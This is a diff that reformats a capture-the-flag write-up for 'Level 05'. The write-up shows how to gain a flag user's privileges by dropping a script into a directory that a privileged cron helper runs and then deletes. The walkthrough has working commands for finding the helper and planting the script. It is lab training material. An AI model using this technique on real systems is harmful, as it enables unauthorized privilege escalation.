@@ -1,32 +1,54 @@
-▐▓▌   ▐▓▓▓▓▌▐▓▌▐▓▌▐▓▓▓▓▌▐▓▌   ▐▓▓▓▓▌▐▓▓▓▓▌
-▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   
-▐▓▌   ▐▓▓▓▌ ▐▓▌▐▓▌▐▓▓▓▌ ▐▓▌   ▐▓▌▐▓▌▐▓▓▓▓▌
-▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌   ▐▓▌
-▐▓▓▓▓▌▐▓▓▓▓▌ ▐▓▓▌ ▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▓▌
+# Level 05
 
-exploit: cron executing everything
+**Exploit:** Abuse of a privileged cron job
 
-=======
-We have nothing. Let's check for files:
+The scheduled job runs files from a writable directory, allowing a script we create to run with the job's privileges.
+
+## Walkthrough
+
+Locate the helper that runs the scheduled tasks:
+
+```bash
 find . / -user flag05
+```
+
+Output:
+
+```text
 /usr/sbin/openarenaserver
 /rofs/usr/sbin/openarenaserver
+```
 
+```bash
 cat /usr/sbin/openarenaserver
+```
+
+Output:
+
+```sh
 #!/bin/sh
 
 for i in /opt/openarenaserver/* ; do
 	(ulimit -t 5; bash -x "$i")
 	rm -f "$i"
 done
+```
 
-This script tells us that every 5 minutes, all the scripts inside /opt/openarenaserver get executed and then removed.
-Then let's create a script that calls getflag and put the result inside a file (the cron cannot simply print getflag as its a cron that executes and we dont have acces to logs).
+The helper runs every file in `/opt/openarenaserver` and removes it afterward. Create a script in that directory that writes the `getflag` output to a file, since cron output is not available in the terminal:
 
+```bash
 touch /opt/openarenaserver/script.sh
-script.sh:
-getflag > /tmp/flag
-chmod +x /opt/openarenaserver/script.sh
+```
 
-Let's wait and check periodically if the /tmp/flag got created yet. Be patient.
+The script contents are:
+
+```sh
+getflag > /tmp/flag
+```
+
+```bash
+chmod +x /opt/openarenaserver/script.sh
+```
+
+Wait for the next scheduled run, then check `/tmp/flag` for the result.
 
